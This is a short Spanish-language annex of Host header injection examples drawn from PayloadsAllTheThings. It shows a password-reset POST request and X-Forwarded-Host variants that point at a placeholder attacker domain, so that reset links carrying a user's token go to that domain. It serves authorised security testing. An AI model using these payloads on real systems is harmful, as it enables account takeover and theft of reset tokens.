# Host header injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Account Takeover/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Account%20Takeover/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Flujo de recuperación de contraseña / Toma de cuenta por envenenamiento del enlace de recuperación

```http
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: [ATTACKER.DOMAIN.TLD]
```

### Variantes presentes en tablas o texto del apartado

```text
Host: [ATTACKER.DOMAIN.TLD]
X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]
https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
